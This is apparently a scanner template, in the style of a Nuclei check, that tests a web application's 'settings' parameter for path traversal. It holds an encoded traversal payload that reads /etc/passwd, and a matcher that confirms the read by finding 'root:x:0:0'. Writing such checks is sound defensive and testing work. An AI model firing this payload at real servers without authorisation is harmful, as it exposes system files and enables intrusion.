id: lfi6-0824
name: 'Traversal in settings'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via settings'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      settings:
        - '%2e%2e%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
